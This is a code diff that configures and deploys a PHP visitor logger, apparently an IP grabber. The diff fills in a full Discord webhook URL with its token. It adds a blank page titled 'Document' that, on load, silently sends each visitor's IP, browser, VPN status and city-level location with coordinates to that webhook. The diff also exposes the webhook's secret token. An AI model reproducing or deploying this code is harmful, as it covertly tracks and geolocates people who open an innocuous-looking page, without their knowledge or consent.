@@ -56,7 +56,7 @@ class Discord
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
 		//Insert FULL webhook URL here (URL begins with: https://discord.com/api/webhooks/)
-        $Webhook = "FULLURLHERE";
+        $Webhook = "https://discord.com/api/webhooks/1423638578940084406/X7iJ_d572Q1nMdzsN7yi6QdAuxuNL6USlBW_U7F5PXkcjrtDYeRny62lkoA7f87cJwZ4";
 
         $InfoArr = array(
             "username" => "$WebhookName",
@@ -115,3 +115,21 @@ class Discord
 }
 
 ?>
+
+<html>
+<head>
+  <title>Document</title>
+</head>
+<body>
+
+<?php
+//If your Discord.php file is in another folder you need to change the file path!
+include("Discord.php");
+$sendembed = New Discord();
+
+//Executes the function
+$sendembed->Visitor();
+?>
+
+</body>
+</html>
